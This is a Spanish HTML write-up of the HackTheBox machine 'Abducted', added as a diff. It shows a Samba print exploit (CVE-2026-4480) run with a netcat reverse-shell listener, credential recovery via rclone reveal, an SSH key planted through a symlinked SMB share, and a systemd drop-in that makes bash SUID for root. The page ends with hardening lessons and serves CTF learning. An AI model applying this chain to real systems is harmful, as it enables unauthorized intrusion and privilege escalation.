@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abducted - HTB Write-up</title>
+    <style>
+        /* Reset y base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0d0f1a;
+            color: #c8d0e0;
+            font-family: 'Fira Code', 'Courier New', monospace;
+            line-height: 1.7;
+            padding: 0 1rem 2rem;
+        }
+        a {
+            color: #6cf0a0;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+        a:hover {
+            color: #a0f0c0;
+            text-shadow: 0 0 8px #6cf0a0;
+        }
+        /* Contenedor principal */
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: #141824;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+            overflow: hidden;
+            padding: 0 0 2rem;
+            border: 1px solid #2a3344;
+        }
+        /* BANNER */
+        .banner {
+            position: relative;
+            width: 100%;
+            height: 280px;
+            background: #1a1f2e url('abducted.png') center/cover no-repeat;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 3px solid #3aaf6a;
+        }
+        .banner::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(13, 15, 26, 0.7);
+            backdrop-filter: blur(2px);
+        }
+        .banner h1 {
+            position: relative;
+            z-index: 2;
+            font-size: 3.2rem;
+            font-weight: 700;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            color: #fff;
+            text-shadow: 0 0 20px #3aaf6a, 0 0 40px #1f4f3a;
+            background: rgba(0,0,0,0.4);
+            padding: 0.5rem 2rem;
+            border-radius: 12px;
+            border: 1px solid rgba(58, 175, 106, 0.3);
+        }
+        .banner .sub {
+            position: relative;
+            z-index: 2;
+            font-size: 1rem;
+            color: #a0c8b0;
+            margin-top: 0.5rem;
+            background: rgba(0,0,0,0.5);
+            padding: 0.2rem 1.2rem;
+            border-radius: 30px;
+            display: inline-block;
+            border: 1px solid #3aaf6a;
+        }
+        .banner-content {
+            text-align: center;
+        }
+
+        /* contenido */
+        .content {
+            padding: 2rem 2.5rem;
+        }
+        h2 {
+            color: #6cf0a0;
+            font-size: 1.8rem;
+            margin: 2rem 0 1rem;
+            border-bottom: 2px solid #2a3344;
+            padding-bottom: 0.3rem;
+        }
+        h3 {
+            color: #a0d8c0;
+            font-size: 1.3rem;
+            margin: 1.5rem 0 0.8rem;
+        }
+        p {
+            margin: 0.8rem 0;
+        }
+        ul, ol {
+            margin: 0.8rem 0 0.8rem 2rem;
+        }
+        li {
+            margin: 0.4rem 0;
+        }
+        code {
+            background: #1f2838;
+            color: #b0e0c0;
+            padding: 0.2rem 0.5rem;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            border: 1px solid #2f3a4a;
+        }
+        pre {
+            background: #0f131f;
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #3aaf6a;
+            color: #c8d8e8;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.6);
+        }
+        .highlight {
+            color: #6cf0a0;
+            font-weight: 600;
+        }
+        .badge {
+            display: inline-block;
+            background: #1f2a3a;
+            padding: 0.1rem 0.8rem;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            color: #a0c8b0;
+            border: 1px solid #3aaf6a;
+            margin-right: 0.5rem;
+        }
+        .flag-placeholder {
+            background: #1a2535;
+            color: #6a8a7a;
+            padding: 0.1rem 1rem;
+            border-radius: 30px;
+            font-family: inherit;
+            border: 1px dashed #4a6a5a;
+        }
+        hr {
+            border: none;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #3aaf6a, transparent);
+            margin: 2rem 0;
+        }
+
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 1.8rem 0 0.5rem;
+            border-top: 1px solid #2a3344;
+            margin-top: 2rem;
+        }
+        .footer .dev-link {
+            display: inline-block;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #6cf0a0;
+            background: linear-gradient(135deg, #1f2a3a, #0d111c);
+            padding: 0.6rem 2rem;
+            border-radius: 40px;
+            border: 1px solid #3aaf6a;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: pulseGlow 2.5s infinite alternate;
+        }
+        .footer .dev-link:hover {
+            background: #1a2535;
+            box-shadow: 0 0 30px #3aaf6a44;
+            transform: scale(1.02);
+            color: #a0f0c0;
+        }
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 5px #3aaf6a33; }
+            100% { box-shadow: 0 0 25px #3aaf6a88; }
+        }
+        .footer small {
+            display: block;
+            margin-top: 0.8rem;
+            color: #5a6a7a;
+            font-size: 0.8rem;
+        }
+        /* responsive */
+        @media (max-width: 700px) {
+            .banner { height: 200px; }
+            .banner h1 { font-size: 2rem; padding: 0.3rem 1rem; }
+            .content { padding: 1rem; }
+            pre { font-size: 0.8rem; padding: 0.8rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- BANNER -->
+    <div class="banner">
+        <div class="banner-content">
+            <h1>ABDUCTED</h1>
+            <div class="sub">HackTheBox · Write-up</div>
+        </div>
+    </div>
+
+    <!-- CONTENIDO -->
+    <div class="content">
+
+        <p style="text-align:center; font-size:1.1rem; color:#a0b8b0;">
+            <span class="badge">Linux</span>
+            <span class="badge">SMB</span>
+            <span class="badge">CVE-2026-4480</span>
+            <span class="badge">Privilege Escalation</span>
+        </p>
+        <p style="text-align:center; color:#5a7a6a;">Máquina <strong>Abducted</strong> de HackTheBox — resolución completa paso a paso.</p>
+        <hr>
+
+        <!-- INTRODUCCIÓN -->
+        <h2>🔍 Introducción</h2>
+        <p>
+            <strong>Abducted</strong> es una máquina Linux de dificultad <em>media</em> que explota un 
+            fallo en el subsistema de impresión de Samba (<strong>CVE-2026-4480</strong>) para obtener 
+            ejecución remota de código. A partir de ahí, mediante la enumeración de archivos de configuración 
+            y el abuso de configuraciones inseguras de SMB, se logra la escalada de privilegios hasta 
+            <code>root</code>.
+        </p>
+
+        <!-- RECONOCIMIENTO -->
+        <h2>📡 Reconocimiento</h2>
+        <h3>Escaneo de puertos</h3>
+        <pre>nmap abducted.htb -sCV -A -oN abducted-default</pre>
+        <p>Resultados:</p>
+        <ul>
+            <li><strong>22/tcp</strong>  → SSH  (OpenSSH 9.6p1)</li>
+            <li><strong>139,445/tcp</strong> → SMB (Samba smbd 4)</li>
+        </ul>
+        <p>No se detectaron otros puertos abiertos, por lo que el vector de ataque será SMB.</p>
+
+        <h3>Enumeración SMB</h3>
+        <pre>nxc smb abducted.htb -u '' -p '' --shares</pre>
+        <p>Se encontraron varios recursos compartidos, destacando:</p>
+        <ul>
+            <li><code>HP-Reception</code> → impresora <span class="highlight">escribible</span> con autenticación nula.</li>
+            <li><code>projects</code> y <code>transfer</code> → sin acceso anónimo.</li>
+        </ul>
+        <p>La presencia de un share de impresora con permisos de escritura apunta directamente a la vulnerabilidad <strong>CVE-2026-4480</strong>.</p>
+
+        <!-- EXPLOTACIÓN -->
+        <h2>💣 Explotación (CVE-2026-4480)</h2>
+        <p>
+            La vulnerabilidad permite ejecutar comandos arbitrarios a través de la descripción del trabajo de impresión 
+            (<code>%J</code>) sin escapar los caracteres meta del shell. El share <code>HP-Reception</code> es el vector ideal.
+        </p>
+        <h3>Clonar el PoC y preparar listener</h3>
+        <pre>git clone https://github.com/TheCyberGeek/CVE-2026-4480-PoC.git
+cd CVE-2026-4480-PoC
+nc -lvnp 8443</pre>
+        <h3>Ejecutar el exploit</h3>
+        <pre>python3 exploit.py 10.129.244.177 10.10.15.154 8443 -P HP-Reception</pre>
+        <p>Se obtiene una shell inversa como el usuario <code>nobody</code> (o <code>samba</code>).</p>
+
+        <!-- POST-EXPLOTACIÓN -->
+        <h2>📁 Post‑explotación y credenciales</h2>
+        <p>Una vez dentro, buscamos archivos de configuración fuera de las rutas habituales:</p>
+        <pre>find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"</pre>
+        <p>Aparece el archivo <code>/opt/offsite-backup/rclone.conf</code> con las credenciales del usuario <code>svc-backup</code>:</p>
+        <pre>[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+pass = [REDACTED]   # ofuscada con rclone</pre>
+        <p>La contraseña está ofuscada con rclone. La decodificamos en nuestra máquina local:</p>
+        <pre>rclone reveal [REDACTED]</pre>
+        <p>Obtenemos la contraseña en texto plano: <code>[REDACTED]</code>.</p>
+        <p>Esta contraseña resulta ser la misma para el usuario <strong>scott</strong>, lo que nos permite acceder por SSH.</p>
+
+        <h2>🔑 Acceso como scott</h2>
+        <pre>ssh scott@10.129.244.177</pre>
+        <p>Una vez autenticados, leemos la flag de usuario:</p>
+        <pre>cat /home/scott/user.txt</pre>
+        <p><span class="flag-placeholder">[USER FLAG REDACTED]</span></p>
+
+        <!-- ESCALADA SCOTT -> MARCUS -->
+        <h2>⬆️ Escalada a Marcus (abuso de SMB)</h2>
+        <p>Revisando la configuración de Samba, encontramos dos directivas peligrosas:</p>
+        <ul>
+            <li><code>wide links = yes</code> → permite enlaces simbólicos fuera del directorio compartido.</li>
+            <li>En el share <code>transfer</code>: <code>force user = marcus</code> → los archivos subidos serán propiedad de Marcus.</li>
+        </ul>
+        <p>Generamos una clave SSH para Marcus y la subimos mediante <code>smbclient</code> aprovechando el enlace simbólico.</p>
+        <pre>ssh-keygen -q -t ed25519 -N '' -f /tmp/k
+ln -s /home/marcus /srv/transfer/keys
+smbclient //127.0.0.1/transfer -U 'scott%[REDACTED]' -c 'mkdir keys/.ssh; put /tmp/k.pub keys/.ssh/authorized_keys'</pre>
+        <p>Ahora podemos iniciar sesión como <strong>marcus</strong>:</p>
+        <pre>ssh marcus@localhost -i /tmp/k</pre>
+
+        <!-- ESCALADA A ROOT -->
+        <h2>👑 Escalada a root (systemd + SUID)</h2>
+        <p>El usuario <strong>marcus</strong> pertenece al grupo <code>operators</code>, y este tiene permisos de escritura sobre <code>/etc/systemd/system/smbd.service.d</code>.</p>
+        <p>Creamos un archivo <code>daffy.conf</code> que ejecute un comando antes de iniciar <code>smbd</code>:</p>
+        <pre>cat > /etc/systemd/system/smbd.service.d/daffy.conf << 'EOF'
+[Service]
+ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
+EOF</pre>
+        <p>Recargamos systemd y reiniciamos el servicio para activar el SUID:</p>
+        <pre>systemctl daemon-reload
+systemctl restart smbd</pre>
+        <p>Verificamos que el bit SUID esté establecido:</p>
+        <pre>ls -la /bin/bash
+-rwsr-sr-x 1 root root ...</pre>
+        <p>Finalmente, obtenemos una shell con privilegios de root:</p>
+        <pre>/bin/bash -p
+# id
+uid=1000(scott) gid=1001(scott) euid=0(root) egid=0(root) ...</pre>
+        <p>Leemos la flag de root:</p>
+        <pre>cat /root/root.txt</pre>
+        <p><span class="flag-placeholder">[ROOT FLAG REDACTED]</span></p>
+
+        <!-- CONCLUSIÓN -->
+        <hr>
+        <h2>✅ Conclusión</h2>
+        <p>
+            La máquina <strong>Abducted</strong> demuestra cómo una vulnerabilidad en Samba puede ser el punto de entrada, 
+            y cómo configuraciones inseguras (enlaces amplios, <code>force user</code>) combinadas con permisos excesivos 
+            en directorios de systemd pueden llevar a la toma de control total del sistema.
+        </p>
+        <p>
+            <strong>Lecciones aprendidas:</strong>
+            <ul>
+                <li>Revisar siempre los permisos de los shares SMB.</li>
+                <li>Deshabilitar <code>wide links</code> y el uso de <code>force user</code> en entornos críticos.</li>
+                <li>Restringir los permisos de escritura en directorios de configuración de systemd.</li>
+            </ul>
+        </p>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            <a href="https://cosm3no1de.github.io/wwwdata-cosm3/" target="_blank" class="dev-link">cosmenoide dev</a>
+            <small>Documentación elaborada para fines educativos · HackTheBox</small>
+        </div>
+
+    </div> <!-- /content -->
+</div> <!-- /container -->
+</body>
+</html>
